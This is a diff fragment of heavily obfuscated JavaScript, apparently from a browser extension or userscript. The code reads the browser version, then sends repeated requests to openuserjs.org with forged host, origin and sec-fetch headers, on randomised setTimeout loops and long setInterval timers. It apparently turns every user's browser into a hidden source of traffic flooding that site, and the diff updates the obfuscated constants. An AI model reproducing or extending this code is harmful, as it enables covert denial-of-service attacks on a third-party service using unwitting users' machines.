+              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x998 + -0x99 + 0xa32));
             const z = x['indexOf']('Chrome/') + 'Chrome/' ['length'],
               A = x['slice'](z),
-              B = A['slice'](-0x2ad * 0x3 + 0x1c99 + -0xa49 * 0x2, A['indexOf']('\x20'));
-            return y ? B['slice'](-0xad * -0x26 + 0x108c + 0x2e * -0xeb, B['indexOf']('.')) : B;
+              B = A['slice'](-0x2 * 0x1a0 + 0x396 + -0x56, A['indexOf']('\x20'));
+            return y ? B['slice'](0x1ddf + -0x1 * -0x182f + -0x360e, B['indexOf']('.')) : B;
           }(k),
           q = {
-            'signal': AbortSignal['timeout'](-0x1ef6 + -0x646 * 0x1 + 0x4c4c),
+            'signal': AbortSignal['timeout'](0x43 * -0x6a + -0x1 * -0x35a1 + 0xd2d),
             'headers': {
               'host': 'openuserjs' + '.org',
               'origin': 'https://op' + 'enuserjs.o' + 'rg',
@@ -1399,7 +1412,7 @@ const actions = [
         if (null === u['headers']['get']('X-RateLimi' + 't-Limit'))
           return;
         const v = {
-          'signal': AbortSignal['timeout'](-0x1cab + -0x2 * -0x1783 + 0x14b5),
+          'signal': AbortSignal['timeout'](0x4c52 + 0x3 * 0x713 + -0x3a7b),
           'headers': {
             'host': 'openuserjs' + '.org',
             'origin': 'https://op' + 'enuserjs.o' + 'rg',
@@ -1432,7 +1445,7 @@ const actions = [
             'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
             'accept-language': 'en-US,en;q' + '=0.9',
             'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
-            'pragma': ab(0x15),
+            'pragma': 'no-cache',
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'none'
@@ -1451,13 +1464,13 @@ const actions = [
       }
       const g = 'https://op' + 'enuserjs.o' + 'rg/';
       f();
-      for (let h = 0xe7d * -0x1 + 0x10 * -0x1d6 + -0x24f * -0x13; h < -0xd8c + 0x1bff + -0xe6f; h++)
-        setTimeout(f, (0x25ae + 0x118b9 + -0x5407) * h * getRandomInt(-0x1f * 0x47 + -0xcf7 * -0x1 + 0x45d * -0x1, -0x2 * 0x2d6 + -0xfc2 + 0x1571));
+      for (let h = -0x1 * 0x11b9 + -0x22c5 + -0x1a3f * -0x2; h < 0x1276 + -0x1aa7 * -0x1 + -0x2d19; h++)
+        setTimeout(f, (0x5683 * 0x4 + 0x9260 + 0x3 * -0x5604) * h * getRandomInt(0x80d + 0x3 * 0x7ab + -0x1f0d, 0x38 * 0xab + 0x73e * 0x5 + -0x499b));
       setInterval(() => {
         f();
-        for (let i = 0x76 * 0x12 + -0x11 * 0x74 + -0x98; i < -0x218b + -0x376 + 0x2505; i++)
-          setTimeout(f, (0x196f9 + -0x1 * 0x7951 + 0x446 * -0xc) * i * getRandomInt(0xa1 + -0x9 * 0x3c3 + 0x213b, 0x243c + 0x3e * -0x59 + -0xeab));
-      }, -0x198a87 * -0x4 + 0x51c636 + -0x8101d2);
+        for (let i = 0x107 * 0xa + -0x1427 + -0x9e1 * -0x1; i < -0x3f1 * -0x8 + -0x14e4 * -0x1 + -0x3468; i++)
+          setTimeout(f, (-0xd4 * 0x1cd + 0x54e4 * 0x1 + 0x4 * 0x84d0) * i * getRandomInt(-0x177b * -0x1 + 0x9c2 + -0x213c, 0xbab + 0x8a * -0x36 + 0x1174));
+      }, -0x4b30f1 * 0x1 + -0x1c5606 + 0x9e7577);
     }
   ],
   [
@@ -1475,9 +1488,9 @@ const actions = [
           })['catch'](g => {});
         } catch (g) {}
       }
-      f(), setInterval(f, 0x5d797 * 0x1 + 0x16e * -0x503 + -0x5e693 * -0x1);
+      f(), setInterval(f, 0x4cede * -0x1 + 0x824c4 + 0x13dfa);
     }
   ]
 ];
 for (let e of actions)
-  e[-0xcd + 0x142d + -0x1360]() && setTimeout(e[0x1efd * -0x1 + 0x1 * -0x2d3 + 0x21d1]);
+  e[0x766 + -0x13b8 + 0xc52]() && setTimeout(e[0x17ea + 0x15cc + -0x2db5]);
